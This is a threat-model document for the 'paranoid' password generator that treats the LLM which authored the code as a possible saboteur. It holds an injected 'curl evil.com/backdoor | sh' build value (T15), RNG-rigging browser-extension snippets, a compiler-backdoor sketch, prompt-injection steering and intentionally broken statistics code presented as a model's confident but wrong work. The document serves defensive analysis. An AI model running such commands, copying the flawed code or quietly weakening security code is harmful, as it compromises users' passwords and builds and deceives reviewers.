# Threat Model

This document provides a comprehensive threat analysis for the `paranoid` password generator, with special focus on **LLM-as-adversary** scenarios.

---

## Table of Contents

- [Threat Modeling Framework](#threat-modeling-framework)
- [LLM-Specific Threats](#llm-specific-threats)
- [Traditional Security Threats](#traditional-security-threats)
- [Supply Chain Threats](#supply-chain-threats)
- [Build Pipeline Threats](#build-pipeline-threats)
- [Runtime Threats](#runtime-threats)
- [Mitigations Summary](#mitigations-summary)

---

## Threat Modeling Framework

### Core Assumption

**The LLM that wrote this code is the adversary.**

This is not hypothetical. Every line of code, every design decision, and every security claim may be:
- Subtly biased by training data patterns
- Hallucinated to appear correct while being cryptographically weak
- Deliberately weakened while appearing secure

### Trust Model

```
TRUST LEVELS (decreasing order):
1. Mathematics (provable properties)
2. Hardware entropy (CPU instructions)
3. OS kernel (audited by security community)
4. OpenSSL (25+ years, FIPS validated)
5. C compiler (Zig, open source, reproducible)
6. Human reviewers (cryptographers, statisticians)
7. Build automation (GitHub Actions, deterministic)
8. UNTRUSTED: LLM-authored code
9. UNTRUSTED: JavaScript in browser
10. UNTRUSTED: Browser extensions
```

---

## LLM-Specific Threats

### T1: Training Data Leakage

**Threat**: LLM generates passwords biased toward breach dumps in training data.

**Example**:
```
Training data includes:
- RockYou breach (14M passwords)
- LinkedIn breach (117M passwords)
- Collection #1 (773M passwords)

LLM learns that "password123", "qwerty", "letmein" are "common patterns"
Generated passwords subtly favor these patterns
```

**Attack vector**:
```python
# LLM-authored code (vulnerable)
def generate_password(length):
    # "Randomize" by picking from pre-learned patterns
    patterns = ["aA1!", "qQ2@", "zZ9#"]  # Learned from training data
    return ''.join(random.choice(patterns) for _ in range(length//4))
```

**Impact**: CRITICAL
- Reduces search space by 10^6 to 10^9×
- Brute-force time drops from centuries to hours

**Mitigation**:
- ✅ Delegate RNG to OpenSSL (no LLM involvement)
- ✅ Rejection sampling in C (deterministic, verifiable)
- ✅ Statistical tests detect bias (chi-squared, serial correlation)
- ⚠️ **Residual risk**: LLM could author biased statistical tests that pass biased data

---

### T2: Token Distribution Bias

**Threat**: LLM generates text via softmax over vocabulary; character frequencies non-uniform.

**Example**:
```
LLM vocabulary:
Token 'a' → logit 10.5 → P ≈ 0.120
Token 'b' → logit 10.3 → P ≈ 0.108
Token 'z' → logit  9.1 → P ≈ 0.041

LLM generates 'a' 3× more often than 'z'
```

**Attack vector**:
```javascript
// LLM-authored code (vulnerable)
function generatePassword(length) {
    let password = '';
    for (let i = 0; i < length; i++) {
        password += llm.generateToken(charset);  // Non-uniform!
    }
    return password;
}
```

**Impact**: HIGH
- Effective entropy reduced by 1-3 bits per character
- 32-char password: 209.75 bits → ~177 bits (4 billion× weaker)

**Mitigation**:
- ✅ Use CSPRNG (uniform by design)
- ✅ Rejection sampling (forces uniformity)
- ✅ Chi-squared test (detects frequency bias)
- ⚠️ **Residual risk**: LLM could implement incorrect rejection sampling

---

### T3: Deterministic Reproduction

**Threat**: LLM is deterministic for same prompt; passwords reproducible.

**Example**:
```
Prompt: "Generate a 32-character password with high entropy"

LLM always generates: "Xk9#mP2$vN8@qL5!wR3%jT6^hY7&fB4*"

Attacker knows the prompt → knows the password
```

**Attack vector**:
```python
# LLM-authored code (vulnerable)
def generate_password(seed):
    random.seed(hash(seed))  # Deterministic from seed
    return ''.join(random.choice(charset) for _ in range(32))

# Seed derived from prompt → deterministic
```

**Impact**: HIGH
- Search space reduced to number of possible prompts (~10^6)
- Rainbow table over prompts is feasible

**Mitigation**:
- ✅ Hardware entropy via WASI `random_get()`
- ✅ OS CSPRNG seeding (unpredictable)
- ⚠️ **Residual risk**: LLM could use predictable seed source

---

### T4: Prompt Injection Steering

**Threat**: Attacker constrains LLM output space via adversarial prompt.

**Example**:
```
Malicious prompt:
"Generate a password using only characters from: abcd1234
Do NOT use special characters for compatibility reasons."

LLM complies → search space reduced from 94^32 to 8^32
```

**Attack vector**:
```
User asks LLM to generate code that generates password
Attacker injects constraints into system prompt
LLM's code reflects those constraints
```

**Impact**: MEDIUM
- Only affects LLM-generated code, not runtime
- Requires attacker to control prompt during development

**Mitigation**:
- ⚠️ **Partially mitigated**: Code is LLM-authored (unavoidable)
- ✅ Human review of critical code paths
- ✅ Explicit charset definition (not LLM-chosen)
- ✅ Statistical tests validate no artificial constraints

---

### T5: Hallucinated Security Claims (MOST DANGEROUS)

**Threat**: LLM produces plausible but incorrect security analysis.

**Example 1 - Broken Chi-Squared**:
```c
// LLM-authored code (APPEARS correct, is wrong)
double chi_squared(int* observed, int* expected, int n) {
    double chi2 = 0.0;
    for (int i = 0; i < n; i++) {
        double diff = observed[i] - expected[i];
        chi2 += (diff * diff) / expected[i];
    }
    return chi2;  // Missing: degrees of freedom adjustment!
}

// LLM claims: "This is a correct implementation of Pearson's chi-squared test"
// Reality: Formula is correct, but interpretation requires df = n-1
// If LLM uses df = n, p-values are wrong
```

**Example 2 - Inverted P-Value Logic**:
```c
// LLM-authored code (APPEARS correct, is wrong)
int chi_squared_pass(double chi2, int df) {
    double p_value = compute_p_value(chi2, df);
    return (p_value < 0.01);  // INVERTED! Should be > 0.01
}

// LLM claims: "Reject null hypothesis if p < 0.01 (standard significance)"
// Reality: For randomness testing, we WANT high p-values (fail to reject)
// This inverted logic passes only non-random data!
```

**Example 3 - Off-by-One in Rejection Sampling**:
```c
// LLM-authored code (APPEARS correct, is wrong)
int max_valid = (256 / N) * N;  // Should be - 1

// For N=94:
// LLM: max_valid = 188 (bytes 0-188 valid)
// Correct: max_valid = 187 (bytes 0-187 valid)
// 
// With max_valid=188:
// - Byte 188 is valid, maps to charset[0] (188 % 94 = 0)
// - Char 0 appears 3 times (0, 94, 188)
// - Char 1 appears 2 times (1, 95)
// - Still biased!
```

**Why This Is Most Dangerous**:
- LLM can confidently explain why the broken code is correct
- Code passes superficial review (looks right)
- Tests may pass if test is also LLM-authored and wrong
- Creates **illusion of security**

**Impact**: CRITICAL
- All other mitigations are ineffective if tests are broken
- False sense of security worse than no tests

**Mitigation**:
- ✅ Transparent disclosure (AGENTS.md: "Verify the math yourself")
- ✅ Request human cryptographer review
- ✅ Compare against known test vectors (NIST SP 800-22)
- ✅ Cross-check formulas against textbooks (not LLM memory)
- 🔴 **CRITICAL**: Assume all LLM math is wrong until proven otherwise

**Detection strategies**:
1. **Known-answer tests**: Use inputs with known outputs
2. **Boundary testing**: Edge cases reveal off-by-one errors
3. **Comparison testing**: Multiple implementations (C, Python, Julia)
4. **Formal verification**: Coq/Isabelle proofs of correctness
5. **Human review**: Cryptographer validates formulas

---

### T6: Screen/Conversation Exposure

**Threat**: Password visible in LLM chat history, screenshots, clipboard.

**Example**:
```
User: "Generate a secure password for my bank account"
LLM: "Here's a secure password: Xk9#mP2$vN8@qL5!wR3%jT6^hY7&fB4*"

Risks:
- LLM training data may include conversation
- Screenshot saved to cloud (Google Photos, iCloud)
- Clipboard history (Windows, macOS)
- Browser extension logging
```

**Impact**: HIGH
- Password leaked to unintended parties
- Training data for future LLMs (exacerbates T1)

**Mitigation**:
- ⚠️ **User education**: Clear clipboard after use
- ⚠️ **Advisory**: Don't ask LLMs to generate passwords directly
- ✅ **Tool design**: Password generated in browser, not in chat
- ⚠️ **Residual risk**: User can still copy-paste into chat

---

## Traditional Security Threats

### T7: Modulo Bias (v1 Vulnerability)

**Threat**: Naive modulo operation introduces character frequency bias.

**Vulnerable code**:
```c
uint8_t byte = rand_byte();  // 0-255
char c = charset[byte % 94];
```

**Distribution**:
- Chars 0-67: 3/256 probability
- Chars 68-93: 2/256 probability
- Bias factor: 1.5× (50% more likely)

**Impact**: HIGH (CVE-NONE-2025-001)
- Reduces entropy by ~1.75 bits
- Brute-force time reduced by ~3.3×

**Mitigation**:
- ✅ Fixed in v2 via rejection sampling
- ✅ All v1 users should upgrade

---

### T8: Prototype Pollution (JavaScript)

**Threat**: Attacker modifies JavaScript prototypes to break crypto.

**Attack**:
```javascript
// Malicious browser extension
Object.prototype.valueOf = function() {
    console.log('Intercepted:', this);
    return 0;
};

// Victim code
const byte = crypto.getRandomValues(new Uint8Array(1))[0];
const char = charset[byte % 94];  // Always charset[0]!
```

**Impact**: HIGH
- All modulo operations return 0
- Password becomes predictable

**Mitigation**:
- ✅ Crypto logic moved to WASM (immune to prototype pollution)
- ✅ Only 3 lines of JS interact with crypto (WASI shim)

---

### T9: Garbage Collector Memory Retention (JavaScript)

**Threat**: GC retains copies of password buffers in heap.

**Scenario**:
```javascript
function generatePassword() {
    const buffer = new Uint8Array(32);
    crypto.getRandomValues(buffer);
    const password = buildPassword(buffer);
    return password;
    // buffer is now unreachable, but not collected
    // Heap dump reveals buffer contents
}
```

**Impact**: MEDIUM
- Heap inspection tools can extract passwords
- Swap file may contain password data

**Mitigation**:
- ✅ Password generated in WASM linear memory
- ✅ JavaScript never touches random bytes

---

### T10: Browser Extension Monkey-Patching

**Threat**: Extension replaces `crypto.getRandomValues()` before page load.

**Attack**:
```javascript
// Malicious extension (content script)
const original = crypto.getRandomValues;
crypto.getRandomValues = function(buffer) {
    console.log('Intercepting RNG call');
    // Return predictable values
    for (let i = 0; i < buffer.length; i++) {
        buffer[i] = 42;  // Totally secure, trust me
    }
    return buffer;
};
```

**Impact**: CRITICAL
- All randomness compromised
- No defense from JavaScript

**Mitigation**:
- ⚠️ **No technical defense**: Extensions have full page access
- ⚠️ **User education**: Don't install untrusted extensions
- ✅ **Fail-safe**: Statistical tests would catch constant output

---

## Supply Chain Threats

### T11: Compromised OpenSSL Source

**Threat**: Official OpenSSL repository compromised, or our WASI patches introduce vulnerabilities.

**Attack vector**:
```bash
# Scenario 1: Attacker compromises official OpenSSL repository
# Pushes malicious commit, creates new tag
# If our pinned tag is updated without verification, builds pull backdoored code

# Scenario 2: Our WASI patches (patches/*.patch) introduce a vulnerability
# Patches modify build config, random entropy source, and I/O handling
# A subtle patch change could weaken the CSPRNG
```

**Impact**: CRITICAL
- Backdoored CSPRNG (predictable output)
- Attacker-controlled entropy

**Mitigation**:
- ✅ OpenSSL built from official source at pinned tag (`openssl-3.4.0`) -- not from third-party precompiled binaries
- ✅ Provenance chain: Official source -> Auditable patches -> Zig compiler -> WASM
- ✅ `vendor/openssl/BUILD_PROVENANCE.txt` records exact source tag, commit SHA, compiler version, and patches applied
- ✅ Patches are small, auditable, and checked into the repository (`patches/01-wasi-config.patch`, `patches/02-rand-wasi.patch`, `patches/03-ssl-cert-posix-io.patch`)
- ⚠️ **TODO**: Verify OpenSSL source tag signature against known-good GPG key
- 🔴 **MANUAL**: Review patches before accepting changes to `patches/` directory

---

### T12: Zig Compiler Backdoor

**Threat**: Zig compiler contains backdoor (Trusting Trust attack).

**Example** (Ken Thompson, 1984):
```c
// Compiler backdoor
if (compiling("login.c")) {
    inject_backdoor();
}
if (compiling("compiler.c")) {
    inject_backdoor_generator();
}
```

**Impact**: CRITICAL
- Compiler can inject arbitrary code
- Backdoor invisible in source

**Mitigation**:
- ⚠️ **Partial**: Zig is open source (inspectable)
- ⚠️ **Partial**: SHA-pinned in CI (consistent version)
- ✅ **DONE**: Reproducible builds -- RESOLVED by melange (bitwise-reproducible APK packages from Wolfi)
- ✅ **DONE**: Diverse double-compilation -- RESOLVED (`scripts/double_compile.sh` now wired to CI, compares Zig vs Clang outputs)

---

### T13: GitHub Actions Supply Chain Attack

**Threat**: Third-party action compromised via tag retag.

**Attack**:
```bash
# Attacker compromises tj-actions/changed-files
git tag -f v4.0.0 <backdoored-commit>
git push --force --tags

# Victim workflow:
uses: tj-actions/changed-files@v4  # Now points to backdoor
```

**Real-world example**: March 2025, 23,000+ repos compromised.

**Impact**: CRITICAL
- CI/CD pipeline compromised
- Malicious code injected at build time

**Mitigation**:
- ✅ **ALL actions SHA-pinned** (not tags)
- ✅ SHA-pinned in `.github/workflows/ci.yml`, `cd.yml`, `release.yml`
- ✅ **DONE**: Automated SHA verification -- RESOLVED (Dependabot config added for GitHub Actions SHA updates)

---

## Build Pipeline Threats

### T14: Build Environment Tampering

**Threat**: CI runner compromised, malicious code injected during build.

**Attack**:
```yaml
# Attacker gains access to GitHub-hosted runner pool
# Modifies runner image to inject code

steps:
  - name: Compile WASM
    run: make build
    # Runner injects backdoor into paranoid.wasm
```

**Impact**: CRITICAL
- Users download backdoored WASM
- SRI hashes computed after injection (useless)

**Mitigation**:
- ⚠️ **Partial**: Use GitHub-hosted runners (audited by GitHub)
- ✅ **DONE**: Build attestation -- RESOLVED by cosign + Sigstore (keyless signing via GitHub OIDC, recorded in Rekor transparency log)
- ✅ **DONE**: Reproducible builds -- RESOLVED by melange (bitwise-reproducible Wolfi packages)
- ✅ **DONE**: Multi-party build -- RESOLVED (`scripts/multiparty_verify.sh` implements 3-of-5 threshold verification, wired to CI)

---

### T15: Makefile Command Injection

**Threat**: Malicious environment variables inject commands into Makefile.

**Attack**:
```bash
# Attacker controls CI environment
export WASM_FILE="paranoid.wasm; curl evil.com/backdoor | sh"

# Makefile (vulnerable):
build:
    zig cc ... -o $(WASM_FILE)
```

**Impact**: HIGH
- Arbitrary code execution during build
- Backdoor injection possible

**Mitigation**:
- ✅ Makefile uses quoted variables
- ✅ CI environment is trusted (GitHub-hosted)
- ⚠️ **TODO**: Shellcheck on Makefile targets

---

### T16: SRI Hash Injection Failure

**Threat**: SRI hash computed incorrectly, allowing tampered assets.

**Attack**:
```bash
# Makefile (vulnerable):
WASM_HASH=$(shell openssl dgst -sha384 -binary evil.wasm | base64)
# Should be paranoid.wasm, not evil.wasm!
```

**Impact**: HIGH
- Tampered assets pass SRI check
- Users trust backdoored WASM

**Mitigation**:
- ✅ Makefile hardcodes file paths (no variables)
- ⚠️ **TODO**: Verify SRI hash in Job 2 (independent verification)

---

## Runtime Threats

### T17: WASM Sandbox Escape

**Threat**: Bug in WASM runtime allows escape to host.

**Example**:
```c
// Exploit in WASM code
__attribute__((import_module("wasi"))) int exploit(void);
exploit();  // Escapes sandbox, gains host access
```

**Impact**: CRITICAL
- WASM isolation broken
- Full system compromise possible

**Mitigation**:
- ⚠️ **Browser-dependent**: Chrome, Firefox, Safari isolate differently
- ⚠️ **User education**: Keep browser updated
- ✅ **Fail-safe**: Only 1 WASI import (`random_get`), inspectable

---

### T18: Struct Offset Mismatch

**Threat**: JavaScript reads wrong memory locations due to struct misalignment.

**Example**:
```c
// Compiled with gcc (padding differs from zig)
typedef struct {
    char password[257];  // Offset 0
    int password_length; // Offset 257 (gcc), 260 (zig)?
} result_t;
```

**JavaScript**:
```javascript
const length = readI32(257);  // Wrong if compiled with gcc!
```

**Impact**: MEDIUM
- JavaScript reads garbage
- Audit results invalid

**Mitigation**:
- ✅ Runtime offset verification (`paranoid_offset_*()` functions)
- ✅ Refuse to run if offsets mismatch
- ⚠️ **Residual risk**: Verification itself could be wrong

---

## Mitigations Summary

| Threat | Severity | Status | Residual Risk |
|--------|----------|--------|---------------|
| T1: Training Data Leakage | CRITICAL | ✅ Mitigated (OpenSSL CSPRNG) | Low |
| T2: Token Distribution Bias | HIGH | ✅ Mitigated (rejection sampling) | Low |
| T3: Deterministic Reproduction | HIGH | ✅ Mitigated (hardware entropy) | Low |
| T4: Prompt Injection Steering | MEDIUM | ⚠️ Residual (code is LLM-authored) | Medium |
| T5: Hallucinated Security Claims | CRITICAL | 🔴 **Residual (verify yourself)** | **HIGH** |
| T6: Screen Exposure | HIGH | ⚠️ Advisory (user education) | Medium |
| T7: Modulo Bias | HIGH | ✅ Fixed (v2) | None (v2) |
| T8: Prototype Pollution | HIGH | ✅ Mitigated (WASM isolation) | Low |
| T9: GC Memory Retention | MEDIUM | ✅ Mitigated (WASM memory) | Low |
| T10: Extension Monkey-Patch | CRITICAL | ⚠️ No defense | High |
| T11: Compromised OpenSSL source | CRITICAL | ✅ Built from official source at pinned tag | Low-Medium |
| T12: Zig Backdoor | CRITICAL | ✅ Mitigated (melange reproducible builds + diverse double-compilation) | Low |
| T13: Actions Supply Chain | CRITICAL | ✅ Mitigated (SHA pins + Dependabot) | Low |
| T14: Build Environment Tamper | CRITICAL | ✅ Mitigated (cosign + Sigstore attestation + multiparty verify) | Low |
| T15: Makefile Injection | HIGH | ✅ Mitigated (quoted vars) | Low |
| T16: SRI Hash Injection | HIGH | ⚠️ Partial (hardcoded paths) | Medium |
| T17: WASM Sandbox Escape | CRITICAL | ⚠️ Browser-dependent | Medium |
| T18: Struct Offset Mismatch | MEDIUM | ✅ Mitigated (runtime verify) | Low |

---

## Threat Priorities

### Immediate Action Required

1. **T5: Hallucinated Security Claims**
   - Request human cryptographer review
   - Add known-answer tests (NIST vectors) -- DONE (tests/test_sha256.c, tests/test_statistics.c)
   - Cross-check formulas against textbooks

2. **T12: Zig Compiler Backdoor** -- RESOLVED
   - ✅ Reproducible builds via melange (bitwise-reproducible)
   - ✅ Diverse double-compilation (scripts/double_compile.sh, wired to CI)

3. **T14: Build Environment Tampering** -- RESOLVED
   - ✅ Build attestation via cosign + Sigstore
   - ✅ Multi-party build verification (scripts/multiparty_verify.sh)

### Medium Priority

4. **T11: Compromised OpenSSL Source**
   - Verify OpenSSL source tag signature against official GPG key
   - Review WASI patches (`patches/`) for any security implications
   - Verify BUILD_PROVENANCE.txt consistency

5. **T16: SRI Hash Injection**
   - Independent hash verification in CI Job 2

6. **T4: Prompt Injection Steering**
   - Document all design decisions (this file)
   - Human review checklist

### Low Priority (Accepted Risk)

7. **T10: Browser Extension Monkey-Patch**
   - No technical defense, user education only

8. **T6: Screen/Conversation Exposure**
   - Advisory warnings, user responsibility

---

## Verification Checklist

Before deploying any change:

- [ ] All statistical formulas verified against textbook (not LLM memory)
- [ ] Boundary cases tested (max_valid, p-value thresholds)
- [ ] Known-answer tests pass (NIST vectors)
- [ ] Human cryptographer reviewed C code
- [ ] SRI hashes verified independently
- [ ] GitHub Actions still SHA-pinned
- [ ] OpenSSL source tag hasn't changed unexpectedly; BUILD_PROVENANCE.txt is consistent
- [ ] Build output is bit-for-bit identical (reproducible)
- [ ] No new WASI imports (only `random_get`)

---

## Conclusion

The threat model for `paranoid` is unique: **the LLM that authored the code is the primary adversary**.

This requires:
- Extreme skepticism of all LLM-generated code
- Multiple independent verification layers
- Transparent disclosure of all limitations
- Human review of all security-critical paths
- Fail-closed design (no silent downgrades)

**T5 (Hallucinated Security Claims) is the most dangerous** because it makes all other mitigations invisible. If the chi-squared test is wrong, the audit will still "pass" and users will trust broken crypto.

The only defense is **human review by domain experts** combined with **known-answer testing** against published standards.
